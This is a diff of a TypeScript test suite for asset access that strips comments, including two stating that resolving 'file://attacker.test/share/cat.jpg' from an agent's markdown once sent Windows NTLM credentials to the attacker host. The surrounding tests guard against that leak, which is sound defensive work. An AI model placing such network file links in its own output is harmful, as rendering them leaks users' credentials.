@@ -615,8 +615,6 @@ describe("AssetAccess", () => {
       }).pipe(Effect.provide(layerTest)),
   );
 
-  // Resolving `file://attacker.test/share/cat.jpg` from an agent's markdown sent the
-  // Windows user's NTLM credentials to attacker.test.
   it.effect("never resolves a network media path outside the thread's project", () =>
     Effect.gen(function* () {
       const fs = yield* FileSystem.FileSystem;
@@ -656,8 +654,6 @@ describe("AssetAccess", () => {
     }).pipe(Effect.provide(layerTest)),
   );
 
-  // Resolving `file://attacker.test/share/cat.jpg` from an agent's markdown sent the
-  // Windows user's NTLM credentials to attacker.test.
   it.effect("never resolves a network media path outside the thread's project", () =>
     Effect.gen(function* () {
       const fs = yield* FileSystem.FileSystem;
@@ -1669,7 +1665,6 @@ describe("AssetAccess", () => {
         }),
       },
     ]);
-    // Clients that predate `repository` get the checkout's.
     const layerIdentities = Layer.mock(RepositoryIdentityResolver.RepositoryIdentityResolver)({
       resolve: () =>
         Effect.succeed({
@@ -1681,7 +1676,6 @@ describe("AssetAccess", () => {
         }),
     });
     return Effect.gen(function* () {
-      // Every client and server release spells the resource this way on the wire.
       const { resource } = yield* decodeAssetCreateUrlInput({
         resource: { _tag: "github-media", cwd: "/repo", url },
       });
@@ -1705,11 +1699,9 @@ describe("AssetAccess", () => {
         { url: media.fetchUrl, headers: { range: "bytes=0-4" }, repository: "owner/repo" },
       ]);
       expect(response.status).toBe(206);
-      // The upstream sent no type, so it comes from the file name the host gave the media.
       expect(response.headers["content-type"]).toBe("image/png");
       expect(response.headers["content-length"]).toBe("5");
 
-      // A pull request's own repository wins over the checkout it is shown in.
       yield* sourceControlMediaResponse({ ...asset, repository: "enterprise/private" }, {});
       expect(fetched.at(-1)?.repository).toBe("enterprise/private");
     }).pipe(Effect.provide(Layer.mergeAll(layerTest, layerDrivers, layerIdentities)));
